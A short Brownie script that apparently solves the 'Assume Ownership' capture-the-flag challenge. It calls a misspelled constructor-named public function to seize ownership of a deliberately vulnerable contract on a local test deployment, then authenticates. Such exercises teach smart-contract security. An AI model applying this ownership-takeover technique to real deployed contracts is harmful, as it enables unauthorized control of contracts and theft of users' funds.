from brownie import AssumeOwnershipChallenge, accounts


def main():
    deployer = accounts[0]
    player = accounts[1]

    contract = AssumeOwnershipChallenge.deploy({'from': deployer})

    contract.AssumeOwmershipChallenge({'from': player})
    contract.authenticate({'from': player})

    assert contract.isComplete() == True
